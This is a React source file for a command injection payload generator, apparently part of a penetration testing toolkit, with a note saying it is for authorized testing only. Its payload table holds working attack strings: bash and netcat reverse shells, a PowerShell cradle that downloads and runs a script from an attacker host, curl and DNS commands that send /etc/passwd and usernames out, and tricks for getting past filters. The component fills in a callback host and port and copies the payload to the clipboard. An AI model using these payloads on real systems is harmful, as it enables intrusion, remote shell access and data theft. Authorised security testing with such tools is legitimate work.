import React from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faTerminal, faCopy, faCheckCircle, faCode } from '@fortawesome/free-solid-svg-icons';

export type CommandInjectionPayloadData = {
  category?: CmdCategory;
  osType?: OsType;
  selectedPayload?: string;
  customCommand?: string;
  output?: string;
};

export type CmdCategory = 'basic' | 'chained' | 'blind' | 'time-based' | 'oob' | 'filter-bypass';
export type OsType = 'unix' | 'windows' | 'both';

type Props = {
  data: CommandInjectionPayloadData | undefined;
  onChange: (data: CommandInjectionPayloadData) => void;
};

type Payload = {
  name: string;
  payload: string;
  os: OsType;
  description: string;
};

const cmdPayloads: Record<CmdCategory, Payload[]> = {
  'basic': [
    { name: 'Semicolon separator', payload: '; id', os: 'unix', description: 'Command separator' },
    { name: 'Ampersand separator', payload: '& whoami', os: 'windows', description: 'Windows command separator' },
    { name: 'Pipe operator', payload: '| id', os: 'unix', description: 'Pipe to command' },
    { name: 'Newline separator', payload: '\nid', os: 'unix', description: 'Newline as separator' },
    { name: 'Backtick execution', payload: '`id`', os: 'unix', description: 'Command substitution' },
    { name: 'Dollar substitution', payload: '$(id)', os: 'unix', description: 'Command substitution (POSIX)' },
    { name: 'Double ampersand', payload: '&& id', os: 'both', description: 'Execute if previous succeeds' },
    { name: 'Double pipe', payload: '|| id', os: 'both', description: 'Execute if previous fails' },
  ],
  'chained': [
    { name: 'Multi-command chain', payload: '; id; whoami; uname -a', os: 'unix', description: 'Multiple commands' },
    { name: 'Reverse shell (bash)', payload: '; bash -i >& /dev/tcp/ATTACKER/PORT 0>&1', os: 'unix', description: 'Bash reverse shell' },
    { name: 'Reverse shell (nc)', payload: '; nc -e /bin/sh ATTACKER PORT', os: 'unix', description: 'Netcat reverse shell' },
    { name: 'File write', payload: '; echo "test" > /tmp/pwned.txt', os: 'unix', description: 'Write to file' },
    { name: 'Windows chain', payload: '& whoami & net user & ipconfig', os: 'windows', description: 'Windows command chain' },
    { name: 'PowerShell download', payload: '& powershell -c "IEX(New-Object Net.WebClient).downloadString(\'http://ATTACKER/shell.ps1\')"', os: 'windows', description: 'PS download cradle' },
  ],
  'blind': [
    { name: 'Sleep (Unix)', payload: '; sleep 10', os: 'unix', description: '10 second delay' },
    { name: 'Ping delay (Unix)', payload: '; ping -c 10 127.0.0.1', os: 'unix', description: 'Delay via ping' },
    { name: 'Timeout (Windows)', payload: '& timeout 10', os: 'windows', description: 'Windows delay' },
    { name: 'Ping delay (Windows)', payload: '& ping -n 10 127.0.0.1', os: 'windows', description: 'Windows ping delay' },
    { name: 'DNS lookup', payload: '; nslookup ATTACKER.COM', os: 'both', description: 'Trigger DNS for confirmation' },
    { name: 'HTTP callback', payload: '; curl http://ATTACKER.COM/callback', os: 'unix', description: 'HTTP callback confirmation' },
  ],
  'time-based': [
    { name: 'Sleep 5 seconds', payload: '; sleep 5 #', os: 'unix', description: 'Confirm with 5s delay' },
    { name: 'Sleep 10 seconds', payload: '| sleep 10 |', os: 'unix', description: 'Confirm with 10s delay' },
    { name: 'Conditional sleep', payload: '; if [ 1 -eq 1 ]; then sleep 5; fi', os: 'unix', description: 'Conditional delay' },
    { name: 'Windows timeout', payload: '| timeout /t 5 /nobreak', os: 'windows', description: 'Windows 5s delay' },
    { name: 'PowerShell sleep', payload: '& powershell Start-Sleep -s 5', os: 'windows', description: 'PS sleep' },
  ],
  'oob': [
    { name: 'DNS exfil (data)', payload: '; ping $(whoami).ATTACKER.COM', os: 'unix', description: 'Exfiltrate via DNS' },
    { name: 'HTTP exfil (data)', payload: '; curl http://ATTACKER.COM/?d=$(cat /etc/passwd | base64)', os: 'unix', description: 'HTTP data exfil' },
    { name: 'Burp Collaborator', payload: '; nslookup $(whoami).BURP-COLLAB-SUBDOMAIN', os: 'unix', description: 'Burp collaborator' },
    { name: 'Windows DNS exfil', payload: '& nslookup %username%.ATTACKER.COM', os: 'windows', description: 'Windows DNS exfil' },
    { name: 'Wget callback', payload: '; wget http://ATTACKER.COM/$(id)', os: 'unix', description: 'Wget callback' },
  ],
  'filter-bypass': [
    { name: 'Space bypass (IFS)', payload: ';cat${IFS}/etc/passwd', os: 'unix', description: 'Use $IFS instead of space' },
    { name: 'Space bypass (tab)', payload: ';\tcat\t/etc/passwd', os: 'unix', description: 'Tab instead of space' },
    { name: 'Space bypass ({,})', payload: ';{cat,/etc/passwd}', os: 'unix', description: 'Brace expansion' },
    { name: 'Quotes bypass', payload: ';c\'a\'t /etc/passwd', os: 'unix', description: 'Quote injection' },
    { name: 'Backslash bypass', payload: ';c\\at /etc/passwd', os: 'unix', description: 'Backslash insertion' },
    { name: 'Variable bypass', payload: ';$u$n$a$m$e -a', os: 'unix', description: 'Variable insertion' },
    { name: 'Hex encoding', payload: ';$(printf "\\x69\\x64")', os: 'unix', description: 'Hex encoded command (id)' },
    { name: 'Base64 decode exec', payload: ';echo aWQ= | base64 -d | sh', os: 'unix', description: 'Base64 decode and execute' },
    { name: 'Wildcard bypass', payload: ';/???/??t /etc/passwd', os: 'unix', description: 'Wildcard path' },
  ],
};

const categories: { id: CmdCategory; label: string }[] = [
  { id: 'basic', label: 'Basic' },
  { id: 'chained', label: 'Chained' },
  { id: 'blind', label: 'Blind' },
  { id: 'time-based', label: 'Time-Based' },
  { id: 'oob', label: 'Out-of-Band' },
  { id: 'filter-bypass', label: 'Filter Bypass' },
];

const CommandInjectionPayload: React.FC<Props> = ({ data, onChange }) => {
  const category = data?.category ?? 'basic';
  const osType = data?.osType ?? 'unix';
  const selectedPayload = data?.selectedPayload ?? '';
  const customCommand = data?.customCommand ?? 'ATTACKER';
  const output = data?.output ?? '';
  const [copiedPayload, setCopiedPayload] = React.useState<string | null>(null);

  const payloads = cmdPayloads[category].filter(p => p.os === osType || p.os === 'both');

  const handleSelectPayload = (payloadName: string) => {
    const payload = cmdPayloads[category].find(p => p.name === payloadName);
    if (payload) {
      const processedPayload = payload.payload
        .replace(/ATTACKER\.COM/g, customCommand)
        .replace(/ATTACKER/g, customCommand)
        .replace(/PORT/g, '4444');
      onChange({ ...data, selectedPayload: payloadName, output: processedPayload });
    }
  };

  const handleCopy = async (text: string, name: string) => {
    await navigator.clipboard.writeText(text);
    setCopiedPayload(name);
    setTimeout(() => setCopiedPayload(null), 2000);
  };

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center justify-between mb-3">
        <div className="text-xs text-slate-200">Command Injection Payloads</div>
      </div>

      <div className="text-[10px] text-slate-500 mb-3">
        Generates command injection test payloads for security testing.
      </div>

      <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3">
        <div className="grid grid-cols-2 gap-2">
          <div>
            <label className="text-[10px] text-slate-500 mb-1 block">Callback/Target</label>
            <input
              type="text"
              value={customCommand}
              onChange={(e) => onChange({ ...data, customCommand: e.target.value })}
              placeholder="attacker.com"
              className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-blue-500"
            />
          </div>
          <div>
            <label className="text-[10px] text-slate-500 mb-1 block">OS Type</label>
            <select
              value={osType}
              onChange={(e) => onChange({ ...data, osType: e.target.value as OsType, selectedPayload: '', output: '' })}
              className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-blue-500"
            >
              <option value="unix">Unix/Linux</option>
              <option value="windows">Windows</option>
              <option value="both">Both</option>
            </select>
          </div>
        </div>
      </div>

      <div className="mb-3">
        <label className="text-[10px] text-slate-500 mb-2 block">Category</label>
        <div className="grid grid-cols-3 gap-1">
          {categories.map((cat) => (
            <button
              key={cat.id}
              onClick={() => onChange({ ...data, category: cat.id, selectedPayload: '', output: '' })}
              className={`px-2 py-1 rounded text-[10px] font-medium transition-colors border ${
                category === cat.id
                  ? 'bg-orange-500/20 border-orange-500/50 text-orange-300'
                  : 'bg-slate-800 border-slate-700 text-slate-400 hover:border-slate-500'
              }`}
            >
              {cat.label}
            </button>
          ))}
        </div>
      </div>

      <div className="mb-3">
        <label className="text-[10px] text-slate-500 mb-2 block">Payloads ({payloads.length})</label>
        <div className="space-y-1 max-h-28 overflow-y-auto">
          {payloads.map((payload) => (
            <button
              key={payload.name}
              onClick={() => handleSelectPayload(payload.name)}
              className={`w-full text-left px-2 py-1.5 rounded text-[10px] transition-colors flex items-center justify-between border ${
                selectedPayload === payload.name
                  ? 'bg-orange-900/30 border-orange-500/50 text-slate-200'
                  : 'bg-slate-800/50 text-slate-300 hover:bg-slate-700 border-slate-700'
              }`}
            >
              <div className="flex items-center gap-2">
                <span className={`text-[9px] px-1 rounded ${payload.os === 'unix' ? 'bg-green-800/50 text-green-300' : payload.os === 'windows' ? 'bg-blue-800/50 text-blue-300' : 'bg-purple-800/50 text-purple-300'}`}>
                  {payload.os === 'unix' ? 'NIX' : payload.os === 'windows' ? 'WIN' : 'ALL'}
                </span>
                <span>{payload.name}</span>
              </div>
              <button
                onClick={(e) => {
                  e.stopPropagation();
                  const processed = payload.payload
                    .replace(/ATTACKER\.COM/g, customCommand)
                    .replace(/ATTACKER/g, customCommand)
                    .replace(/PORT/g, '4444');
                  handleCopy(processed, payload.name);
                }}
                className="text-[9px] text-slate-500 hover:text-slate-300"
              >
                <FontAwesomeIcon
                  icon={copiedPayload === payload.name ? faCheckCircle : faCopy}
                  className="w-2.5 h-2.5"
                />
              </button>
            </button>
          ))}
        </div>
      </div>

      {output && (
        <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3">
          <div className="flex items-center justify-between mb-1">
            <label className="text-[10px] text-slate-400 flex items-center gap-2">
              <FontAwesomeIcon icon={faTerminal} className="w-3 h-3" />
              Generated Payload
            </label>
            <button
              onClick={() => handleCopy(output, 'output')}
              className="text-[9px] text-slate-500 hover:text-slate-300 flex items-center gap-1"
            >
              <FontAwesomeIcon icon={copiedPayload === 'output' ? faCheckCircle : faCopy} className="w-2.5 h-2.5" />
              Copy
            </button>
          </div>
          <pre className="w-full p-2 bg-black/30 border border-slate-700 rounded text-green-400 text-[10px] font-mono overflow-x-auto whitespace-pre-wrap">
            {output}
          </pre>
          {selectedPayload && (
            <div className="text-[10px] text-slate-500 mt-1">
              {cmdPayloads[category].find(p => p.name === selectedPayload)?.description}
            </div>
          )}
        </div>
      )}

      <div className="text-[10px] text-slate-500 space-y-1 border-t border-slate-700 pt-3 mt-auto">
        <div><strong>Command Injection:</strong> Execute arbitrary OS commands</div>
        <div><strong>Common contexts:</strong> system(), exec(), shell_exec(), backticks</div>
        <div className="text-red-400">For authorized security testing only!</div>
      </div>
    </div>
  );
};

export class CommandInjectionPayloadTool {
  static Component = CommandInjectionPayload;
}
